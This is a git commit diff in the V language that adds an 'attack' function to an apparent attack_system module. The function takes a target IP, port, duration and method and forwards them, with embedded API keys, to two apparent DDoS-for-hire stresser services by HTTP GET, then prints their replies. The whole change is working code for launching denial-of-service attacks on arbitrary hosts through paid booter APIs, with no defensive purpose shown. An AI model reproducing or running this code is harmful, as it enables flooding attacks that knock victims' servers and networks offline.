2cb1eacd8db9fbe8b49d791427f64316b1e7b6a1
x0tic0 <87556649+x0tic0@users.noreply.github.com>
2021-11-23 14:18:14 -0500

    Update api_attack.v

--- attack_system/api_attack.v
+++ attack_system/api_attack.v
@@ -1,7 +1,16 @@
 module attack_system
 
+import net.http
 
-pub fn send_attack(ip string, port string, time string, method string) int {
+pub fn attack(ip string, port string, time string, method string) {
+	mut resp := http.get_text("https://api.vortex-api.com/api?key=v-raWfgcs4&host=${ip}&port=${port}&time=${time}&method=${method}")
+	mut respp := http.get_text("https://toxicstress.live/api.go/key=N4N0-934213453&host=${ip}&port=${port}&time=${time}&method=${method}")
+	println(resp)
+	println(respp)
+}
+
+
+pub fn send_attack(ip string, port string, time string, method string) {
 
 }
 
